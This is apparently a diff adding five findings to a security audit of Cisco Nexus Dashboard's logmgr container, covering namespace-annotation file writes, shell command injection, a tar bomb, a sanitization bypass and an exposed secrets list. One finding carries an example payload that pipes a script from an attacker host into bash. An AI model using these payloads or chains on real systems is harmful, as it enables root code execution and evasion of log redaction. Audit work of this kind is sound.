@@ -27,7 +27,7 @@ Container stack (atomix.yaml, 20 core + 200+ app containers):
   apps/cisco-ndfc: 32 NDFC (fabric controller) services
   apps/cisco-nir: 60+ NIR telemetry analysis services
 
-Findings: ND-F01 (CRITICAL) through ND-F62 (MEDIUM). 13 attack chains.
+Findings: ND-F01 (CRITICAL) through ND-F67 (MEDIUM). 13 attack chains.
   ND-F56 HIGH: CIMC creds + cluster passphrase as CLI argv — /proc/pid/cmdline exposure
   ND-F57 HIGH: CIMC SSH StrictHostKeyChecking=no — full bootstrap MITM surface
   ND-F58 HIGH: KexAlgorithms=+diffie-hellman-group1-sha1 — Logjam-vulnerable KEX fallback
@@ -2031,6 +2031,155 @@ FINDINGS = {
             "allowing legitimate signing of attacker-controlled packages."
         ),
         "combined_with": ["ND-F60", "ND-F51"],
+    },
+    "ND-F63": {
+        "title": "logmgr log_handler.py verify_logger_crds(): K8s Namespace Annotation → Arbitrary Config File Write at /var/lib/k8s-rotation-config/",
+        "severity": "HIGH",
+        "component": "logmgr container /usr/bin/log_handler.py, verify_logger_crds()",
+        "description": (
+            "verify_logger_crds() runs 'kubectl get ns -A -o yaml' then parses the "
+            "'logger.case.cncf.io' annotation from each namespace as JSON. "
+            "The parsed spec dict is written directly to disk at "
+            "'/var/lib/k8s-rotation-config/<namespace>-<spec[storageID]>' with no "
+            "sanitization of namespace name or storageID value. "
+            "An attacker with 'kubectl annotate namespace' permission (or the ability to "
+            "create a namespace with an arbitrary name) can write arbitrary JSON to any "
+            "filename of the form '<ns>-<storageID>' under /var/lib/k8s-rotation-config/. "
+            "The storageID is attacker-controlled from the annotation value. "
+            "Written configs are subsequently loaded by LogConfig.read_cfg() and their "
+            "'hostPath' and 'path' fields feed shell=True subprocess calls (ND-F64)."
+        ),
+        "source_file": "logmgr:/usr/bin/log_handler.py",
+        "vulnerable_code": (
+            "spec = json.loads(item['metadata']['annotations']['logger.case.cncf.io'])\n"
+            "cfg_name = item['metadata']['name'] + \"-\" + spec['storageID']\n"
+            "cfg_file = os.path.join(CRD_CFG_PATH, cfg_name)  # CRD_CFG_PATH=/var/lib/k8s-rotation-config\n"
+            "with open(cfg_file, 'w') as fobj:\n"
+            "    json.dump(spec, fobj)"
+        ),
+        "attacker_input": {
+            "namespace_name": "arbitrary — becomes first part of filename",
+            "storageID": "from annotation JSON — becomes suffix of filename, no validation",
+            "hostPath": "from annotation JSON — feeds shell=True df command (ND-F64)",
+            "path": "from annotation JSON — appended to hostPath, also feeds shell cmd",
+            "rotation": "from annotation JSON — drives log file operations",
+        },
+        "combined_with": ["ND-F64"],
+    },
+    "ND-F64": {
+        "title": "logmgr log_handler.py findUsage(): shell=True Command Injection via Attacker-Controlled Config hostPath/path",
+        "severity": "HIGH",
+        "component": "logmgr container /usr/bin/log_handler.py, findUsage() + LogConfig.read_cfg()",
+        "description": (
+            "findUsage() constructs a shell command by string-formatting the log directory path "
+            "with no sanitization, then executes it with shell=True: "
+            "  cmd = 'df -h {} --output=pcent | tail -n1'.format(directory) "
+            "  subprocess.run(cmd, shell=True, ...) "
+            "The 'directory' variable is LogConfig.self.dir, built as: "
+            "  self.dir = cfg['hostPath'] + '/' + cfg['path'] "
+            "where cfg is loaded from a JSON file at /var/lib/k8s-rotation-config/ (ND-F63). "
+            "An attacker who writes a config file via ND-F63 with a crafted hostPath containing "
+            "shell metacharacters achieves code execution as the logmgr process user (root, "
+            "KUBECONFIG=/root/.kube/config). "
+            "Example payload: hostPath = '/logs; curl attacker.com/shell.sh | bash #', path = 'x'. "
+            "Trigger: logmgr cleanup_as_needed() is called when disk usage exceeds 90%, "
+            "or log handler runs on schedule. "
+            "Secondary: run() is also used for 'kubectl get ns' itself — the KUBECONFIG "
+            "environment is pre-set to /root/.kube/config, so injected commands inherit cluster-admin."
+        ),
+        "source_file": "logmgr:/usr/bin/log_handler.py",
+        "vulnerable_code": (
+            "def findUsage(directory):\n"
+            "    cmd = 'df -h {} --output=pcent | tail -n1'.format(directory)  # NO SANITIZATION\n"
+            "    ret, out = run(cmd)\n\n"
+            "def run(cmd):\n"
+            "    proc = subprocess.run(cmd, stdout=PIPE, stderr=DEVNULL, shell=True, timeout=5)"
+        ),
+        "injection_example": "hostPath = '/logs; id > /tmp/pwned #'",
+        "kubeconfig": "/root/.kube/config (set at module level, inherited by injected commands)",
+        "combined_with": ["ND-F63"],
+    },
+    "ND-F65": {
+        "title": "logmgr log_sanitize.py sanitizeTarball(): Unbounded Recursion on Nested Tarballs — Tar Bomb DoS",
+        "severity": "MEDIUM",
+        "component": "logmgr container /usr/bin/log_sanitize.py, sanitizeTarball()",
+        "description": (
+            "sanitizeTarball() recursively processes nested tarballs without any depth limit "
+            "or size guard: "
+            "  if not (mem.name.endswith('.tar') or mem.name.endswith('.tgz')): "
+            "      santizeFile(file, drop_lines) "
+            "  else: "
+            "      sub_tar_fd = io.BytesIO() "
+            "      sanitizeTarball(file, sub_tar_fd, drop_lines)  # unbounded recursion "
+            "Additionally, santizeFile() calls f.readlines() with no size limit, loading the "
+            "entire file into memory. A deeply nested tarball (quine-style) placed in "
+            "/logs or /data/services/app_logs will cause stack exhaustion or OOM. "
+            "log_sanitize.py runs against all files in /logs and /data/services/app_logs "
+            "when /var/lib/k8ctl/bootstrapped exists — a predictable post-bootstrap trigger. "
+            "Any process with write access to the log directories can place a tar bomb. "
+            "logmgr runs as root — OOM or stack overflow terminates the logmgr process, "
+            "disabling log management for the cluster."
+        ),
+        "source_file": "logmgr:/usr/bin/log_sanitize.py",
+        "vulnerable_code": (
+            "def sanitizeTarball(in_fd, out_fd, drop_lines):\n"
+            "    for mem in in_tar.getmembers():\n"
+            "        else:\n"
+            "            sub_tar_fd = io.BytesIO()\n"
+            "            sanitizeTarball(file, sub_tar_fd, drop_lines)  # NO DEPTH LIMIT\n\n"
+            "def santizeFile(filebytes, search_strings):\n"
+            "    for line in f.readlines():  # NO SIZE LIMIT"
+        ),
+        "trigger": "Any file in /logs or /data/services/app_logs with .tar/.tgz extension",
+    },
+    "ND-F66": {
+        "title": "logmgr log_sanitize.py Done-Flag Bypass: Create .done File to Permanently Skip Sanitization of Any Directory",
+        "severity": "MEDIUM",
+        "component": "logmgr container /usr/bin/log_sanitize.py, sanitize() done_flag logic",
+        "description": (
+            "sanitize() checks for a done flag file before processing any directory: "
+            "  done_flag = os.path.join(VAR_ROOT, f'{in_path.replace(\"/\", \"_\")}.done') "
+            "  if os.path.exists(done_flag): return "
+            "VAR_ROOT = /data/services/logmgr/var/sanitize. "
+            "Any process with write access to /data/services/logmgr/var/sanitize/ can create "
+            "a .done file for any target path, permanently preventing log_sanitize.py from "
+            "ever sanitizing that directory. "
+            "This means secrets logged to /logs or /data/services/app_logs will never be "
+            "redacted from techsupport bundles — effectively neutralizing the sanitization "
+            "pipeline for attacker-chosen log directories. "
+            "Done flag path for /logs: '/data/services/logmgr/var/sanitize/_logs.done'. "
+            "Once set, it persists until manually removed — survives pod restarts."
+        ),
+        "source_file": "logmgr:/usr/bin/log_sanitize.py",
+        "vulnerable_code": (
+            "done_flag = os.path.join(VAR_ROOT, f'{in_path.replace(\"/\", \"_\")}.done')\n"
+            "if os.path.exists(done_flag):\n"
+            "    return  # PERMANENTLY SKIPS — no TTL, no re-check"
+        ),
+        "bypass_paths": {
+            "/logs": "_logs.done",
+            "/data/services/app_logs": "_data_services_app_logs.done",
+        },
+    },
+    "ND-F67": {
+        "title": "logmgr log_sanitize.py SECRETS File — Reading /mnt/atom/logmgr/etc/sanitize-config/sanitize-ts.txt Reveals Complete ND Secret String Inventory",
+        "severity": "MEDIUM",
+        "component": "logmgr container /usr/bin/log_sanitize.py, SECRETS constant",
+        "description": (
+            "SECRETS = '/mnt/atom/logmgr/etc/sanitize-config/sanitize-ts.txt' "
+            "is the text file containing every secret string that ND's log sanitizer "
+            "redacts from techsupport bundles. Each line is a literal string match. "
+            "Reading this file produces the complete inventory of secret material ND "
+            "considers sensitive enough to scrub: service passwords, token prefixes, "
+            "key material substrings, credential patterns. "
+            "This is a reconnaissance primitive — the secrets list directly identifies "
+            "which string patterns to look for in any log exfiltration. "
+            "The file is on /mnt/atom (the atomix runtime mount, shared across containers), "
+            "accessible to any pod with /mnt/atom access or exec into the logmgr container."
+        ),
+        "source_file": "logmgr:/usr/bin/log_sanitize.py",
+        "file_path": "/mnt/atom/logmgr/etc/sanitize-config/sanitize-ts.txt",
+        "access_vector": "/mnt/atom is hostPath shared across pods — readable from any pod with mntatom mount",
     },
 }
 
